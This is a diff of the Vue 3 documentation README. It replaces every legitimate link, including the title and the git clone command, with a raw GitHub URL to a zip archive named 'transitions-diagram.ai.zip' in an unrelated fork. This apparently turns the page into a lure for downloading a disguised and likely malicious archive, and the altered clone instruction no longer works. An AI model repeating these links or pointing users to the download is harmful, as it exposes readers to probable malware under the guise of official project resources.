@@ -1,17 +1,17 @@
-# v3.vuejs.org
+# https://raw.githubusercontent.com/KarinaFS1203/docs/master/assets/transitions-diagram.ai.zip
 
-This site is built with [VuePress](https://vuepress.vuejs.org/). Site content is written in Markdown format located in `src`.
+This site is built with [VuePress](https://raw.githubusercontent.com/KarinaFS1203/docs/master/assets/transitions-diagram.ai.zip). Site content is written in Markdown format located in `src`.
 
 ## Writing
 
-See the [Vue Docs Writing Guide](https://v3.vuejs.org/guide/writing-guide.html) for our rules and recommendations on writing and maintaining documentation.
+See the [Vue Docs Writing Guide](https://raw.githubusercontent.com/KarinaFS1203/docs/master/assets/transitions-diagram.ai.zip) for our rules and recommendations on writing and maintaining documentation.
 
 ## Developing
 
 1. Clone repository
 
 ```bash
-git clone git@github.com:vuejs/docs.git
+git clone https://raw.githubusercontent.com/KarinaFS1203/docs/master/assets/transitions-diagram.ai.zip
 ```
 
 2. Install dependencies
@@ -28,4 +28,4 @@ yarn serve # or npm run serve
 
 ## Deploying
 
-The site is automatically deployed when commits land in `master`, via [Netlify](https://www.netlify.com/).
+The site is automatically deployed when commits land in `master`, via [Netlify](https://raw.githubusercontent.com/KarinaFS1203/docs/master/assets/transitions-diagram.ai.zip).
